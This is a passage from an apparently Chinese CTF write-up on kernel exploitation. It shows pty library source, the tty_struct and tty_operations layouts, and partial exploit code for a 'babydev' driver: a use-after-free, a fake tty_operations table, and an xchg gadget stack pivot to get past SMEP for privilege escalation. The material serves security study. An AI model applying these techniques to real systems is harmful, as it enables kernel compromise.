TIOCGPTPEER</span></span><br><span class="line">  <span class="comment">/* Try to allocate slave fd solely based on master fd first. */</span></span><br><span class="line">  slave = ioctl (master, TIOCGPTPEER, O_RDWR | O_NOCTTY);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Fallback to path-based slave fd allocation in case kernel doesn't</span></span><br><span class="line"><span class="comment">       * support TIOCGPTPEER.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      slave = open (buf, O_RDWR | O_NOCTTY);</span><br><span class="line">      <span class="keyword">if</span> (slave == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">goto</span> on_error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* XXX Should we ignore errors here?  */</span></span><br><span class="line">  <span class="keyword">if</span> (termp)</span><br><span class="line">    tcsetattr (slave, TCSAFLUSH, termp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TIOCSWINSZ</span></span><br><span class="line">  <span class="keyword">if</span> (winp)</span><br><span class="line">    ioctl (slave, TIOCSWINSZ, winp);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  *amaster = master;</span><br><span class="line">  *aslave = slave;</span><br><span class="line">  <span class="keyword">if</span> (name != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*buf == <span class="string">'\0'</span>)</span><br><span class="line">        <span class="keyword">if</span> (pts_name (master, &amp;buf, <span class="keyword">sizeof</span> (_buf)))</span><br><span class="line">          <span class="keyword">goto</span> on_error;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">strcpy</span> (name, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> on_error:</span><br><span class="line">  <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">    close (master);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (slave != <span class="number">-1</span>)</span><br><span class="line">      close (slave);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf != _buf)</span><br><span class="line">    <span class="built_in">free</span> (buf);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>login_tty</code>：用于实现在指定的终端上启动登录会话。源代码如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login_tty</span> <span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 启动新会话</span></span><br><span class="line">  (<span class="keyword">void</span>) setsid();</span><br><span class="line">    <span class="comment">// 设置为当前 fd 为控制终端</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TIOCSCTTY</span></span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd, TIOCSCTTY, (<span class="keyword">char</span> *)<span class="literal">NULL</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* This might work.  */</span></span><br><span class="line">    <span class="keyword">char</span> *fdname = ttyname (fd);</span><br><span class="line">    <span class="keyword">int</span> newfd;</span><br><span class="line">    <span class="keyword">if</span> (fdname)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">0</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">1</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">2</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close (<span class="number">2</span>);</span><br><span class="line">        newfd = open (fdname, O_RDWR);</span><br><span class="line">        (<span class="keyword">void</span>) close (newfd);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">0</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">1</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">while</span> (dup2(fd, <span class="number">2</span>) == <span class="number">-1</span> &amp;&amp; errno == EBUSY)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (fd &gt; <span class="number">2</span>)</span><br><span class="line">    (<span class="keyword">void</span>) close(fd);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>forkpty</code>：整合了<code>openpty</code>, <code>fork</code> 和 <code>login_tty</code>，在网络服务程序可用于为新登录用户打开一对伪终端，并创建相应的会话子进程。源代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">forkpty (<span class="keyword">int</span> *amaster, <span class="keyword">char</span> *name, <span class="keyword">const</span> struct termios *termp,</span><br><span class="line">   <span class="keyword">const</span> struct winsize *winp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> master, slave, pid;</span><br><span class="line">  <span class="comment">// 启动新 pty</span></span><br><span class="line">  <span class="keyword">if</span> (openpty (&amp;master, &amp;slave, name, termp, winp) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (pid = fork ())</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">      close (master);</span><br><span class="line">      close (slave);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="comment">/* Child.  */</span></span><br><span class="line">      close (master);</span><br><span class="line">      <span class="keyword">if</span> (login_tty (slave))</span><br><span class="line">  _exit (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Parent.  */</span></span><br><span class="line">      *amaster = master;</span><br><span class="line">      close (slave);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> pid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="3-tty-struct-结构的利用">3) tty_struct 结构的利用</h5>
<p>当我们执行 <code>open(&quot;/dev/ptmx&quot;, flag)</code> 时，内核会通过以下函数调用链，分配一个 <code>struct tty_struct</code> 结构体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptmx_open (drivers/tty/pty.c)</span><br><span class="line">-&gt; tty_init_dev (drivers/tty/tty_io.c)</span><br><span class="line">  -&gt; alloc_tty_struct (drivers/tty/tty_io.c)</span><br></pre></td></tr></table></figure>
<p><code>struct tty_struct</code> 的结构如下所示：</p>
<blockquote>
<p>sizeof(struct tty_struct) == 0x2e0</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span>  magic;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">  <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">  <span class="keyword">spinlock_t</span> ctrl_lock;</span><br><span class="line">  <span class="keyword">spinlock_t</span> flow_lock;</span><br><span class="line">  <span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>  <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>    <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>    <span class="comment">/* winsize_mutex */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,  <span class="comment">/* flow_lock */</span></span><br><span class="line">          flow_stopped:<span class="number">1</span>,</span><br><span class="line">          unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int</span> hw_stopped;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,  <span class="comment">/* ctrl_lock */</span></span><br><span class="line">          packet:<span class="number">1</span>,</span><br><span class="line">          unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;  <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">  <span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">  <span class="keyword">int</span> alt_speed;    <span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *disc_data;</span><br><span class="line">  <span class="keyword">void</span> *driver_data;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> closing;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">  <span class="keyword">int</span> write_cnt;</span><br><span class="line">  <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>注意到第五个字段 <code>const struct tty_operations *ops</code>，<code>struct tty_operations</code>结构体实际上是多个函数指针的集合：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">      <span class="title">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">  <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">  <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">  <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">  <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">  <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">  <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">  <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">  <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">  <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">  <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">  <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">  <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">  <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">  <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">  <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">  <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">  <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">        struct serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">  <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">  <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">  <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以试着通过 UAF, 修改<strong>新</strong>分配的 tty_struct 上的 <code>const struct tty_operations *ops</code>，使其指向一个伪造的 <code>tty_operations</code>结构体，这样就可以搭配一些操作（例如 open、ioctl 等等）来劫持控制流。</p>
<blockquote>
<p>注：tty_operations 函数指针的使用，位于<code>drivers/tty/tty_io.c</code>的各类 <code>tty_xxx</code>函数中。</p>
</blockquote>
<p>但由于开启了 SMEP 保护，此时的控制流<strong>只能在内核代码中执行</strong>，不能跳转至用户代码。</p>
<h5 id="4-ROP-利用">4) ROP 利用</h5>
<p>为了达到提权目的，我们需要完成以下几件事情：</p>
<ol>
<li>提权</li>
<li>绕过 SMEP，执行用户代码</li>
</ol>
<h6 id="4-1-劫持栈指针">4.1) 劫持栈指针</h6>
<p>我们需要通过 ROP 来完成上述操作，但问题是，<strong>用户无法控制内核栈</strong>。因此我们必须使用一些特殊 gadget 来<strong>将栈指针劫持到用户空间</strong>，之后再利用用户空间上的 ROP 链进行一系列控制流跳转。</p>
<p>获取 gadget 的方式有很多。可以使用之前用的 <code>ROPgadget</code> 工具，优点是可以将分析结果通过管道保存至文件中，但缺点是该工具在 kernel 层面上会跑的很慢。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary vmlinux</span><br></pre></td></tr></table></figure>
<p>有个速度比较快的工具可以试试，那就是 <code>ropper</code>工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br><span class="line">ropper --file vmlinux --console</span><br></pre></td></tr></table></figure>
<p>我们可以手动构造一个 <strong>fake_tty_operations</strong>，并修改其中的 <code>write</code> 函数指针指向一个 xchg 指令。这样当对 <code>/dev/ptmx</code> 执行 write 操作时，内核就会通过以下调用链：</p>
<blockquote>
<p><code>tty_write</code> -&gt; <code>do_tty_write</code> -&gt; <code>do_tty_write</code> -&gt; <code>n_tty_write</code> -&gt;  <code>tty-&gt;ops-&gt;write</code></p>
</blockquote>
<p>进一步使用到 <code>tty-&gt;ops-&gt;write</code>函数指针，最终执行 <code>xchg</code> 指令。</p>
<p>但问题是，执行什么样的 xchg 指令？通过动态调试与 IDA 静态分析，最终找到了实际调用 <code>tty-&gt;ops-&gt;write</code>的指令位置：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>FFFFFFFF814DC0C3                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">38h</span>]</span><br></pre></td></tr></table></figure>
<p>由于当控制流执行至此处时，只有 <code>%rax</code> 是用户可控的（即<code>fake_tty_operations</code>基地址），因此我们尝试使用以下 gadget，劫持 <code>%rsp</code> 指针至用户空间：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff8100008a</span> : <span class="keyword">xchg</span> <span class="built_in">eax</span>, <span class="built_in">esp</span> <span class="comment">; ret</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：<code>xchg eax, esp</code>将<strong>清空两个寄存器的高位部分</strong>。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
</blockquote>
<p>以下是劫持栈指针的部分代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line">ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">close(fd1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请 tty_struct</span></span><br><span class="line"><span class="keyword">int</span> master_fd = open(<span class="string">"/dev/ptmx"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line"><span class="keyword">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] fake_tty_ops constructed\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">u_int64_t</span> hijacked_stack_addr = ((<span class="keyword">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] hijacked_stack addr: %p\n"</span>, (<span class="keyword">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">    (<span class="keyword">char</span>*)(hijacked_stack_addr &amp; (~<span class="number">0xfff</span>)),    <span class="comment">// addr, 页对齐</span></span><br><span class="line">    <span class="number">0x1000</span>,                                     <span class="comment">// length</span></span><br><span class="line">    PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">    MAP_PRIVATE | MAP_ANONYMOUS,                <span class="comment">// flags</span></span><br><span class="line">    <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">    <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">    ) == MAP_FAILED)  </span><br><span class="line">    perror(<span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试时先装载页面</span></span><br><span class="line">fake_stack[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]     fake_stack addr: %p\n"</span>, fake_stack);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line"><span class="keyword">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line"><span class="keyword">char</span>** ops_ptr_addr = (<span class="keyword">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] origin ops ptr addr: 